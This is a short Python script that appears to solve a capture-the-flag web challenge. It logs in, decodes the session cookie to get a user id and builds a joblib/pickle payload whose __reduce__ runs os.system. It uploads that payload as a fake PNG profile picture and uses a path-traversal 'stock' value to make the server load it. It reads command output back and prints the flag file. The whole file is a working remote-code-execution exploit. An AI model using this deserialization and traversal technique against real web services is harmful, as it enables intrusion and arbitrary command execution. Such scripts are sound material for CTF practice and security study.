#!/usr/bin/env python3
import io
import os
import json
import joblib
import requests
import base64 as b64

BASE_URL = 'https://chal.duc.tf:30104'
sess = requests.Session()

def make_payload(payload):
    class Model:
        def __reduce__(self):
            return (os.system, (payload,))
    return Model()

# Login
r = sess.post(BASE_URL + '/login', data={'username': 'todo'})
assert r.ok

# Get my cookie, find uid
token = json.loads(
    b64.b64decode(
        sess.cookies['session'].split('.')[0]
    ).decode()
)
uid = token['id']

# Get remote tmp location
r = sess.get(BASE_URL + '/profile-picture/' + uid)
assert r.status_code == 404

# /tmp
remote_path = r.text.split(' ')[-1].replace(uid + '.png', '').rstrip('/')

def exec_cmd(cmd):

    # Make payload
    tmpfile = io.BytesIO()
    payload = make_payload(cmd + ' > ' + remote_path + '/' + uid + '.png')
    # joblib is a model saving method
    joblib.dump(payload, tmpfile)
    tmpfile.seek(0)
    
    # Upload image
    r = sess.post(BASE_URL + '/profile-picture', files={
        'img': ('mal.png', tmpfile)
    })
    assert r.ok

    # Make prediction with that model
    r = sess.post(BASE_URL + '/predict', data={
        'stock': '../' * 15 + '..' + remote_path + '/' + uid + '.png',
        'prices': '1,2'
    })

    # Get result
    r = sess.get(BASE_URL + '/profile-picture/' + uid)
    return r.text
    

files = exec_cmd('ls /').split('\n')
for filename in files:
    if filename.startswith('flag'):
        print(exec_cmd('cat /' + filename))